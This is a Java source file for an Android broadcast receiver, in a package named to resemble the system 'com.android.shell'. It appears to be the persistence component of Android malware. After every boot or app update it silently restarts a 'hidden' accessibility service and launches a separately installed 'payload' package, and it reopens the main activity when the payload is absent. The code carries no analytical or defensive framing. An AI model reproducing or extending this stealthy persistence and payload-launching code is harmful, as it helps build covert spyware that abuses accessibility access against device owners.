package com.android.shell.ghost;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

/** Re-arms the accessibility service and payload after boot or self-update. */
public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        boolean replaced = Intent.ACTION_MY_PACKAGE_REPLACED.equals(action);
        boolean boot = Intent.ACTION_BOOT_COMPLETED.equals(action)
                || "android.intent.action.QUICKBOOT_POWERON".equals(action);
        if (!boot && !replaced) return;

        GhostAccessibilityService.startHiddenService(context);
        if (PayloadInstaller.installedInfo(context, PayloadInstaller.PAYLOAD_PACKAGE) != null) {
            GhostAccessibilityService.launchPayload(context);
        } else {
            try {
                Intent i = new Intent(context, MainActivity.class);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(i);
            } catch (Throwable ignored) {}
        }
    }
}
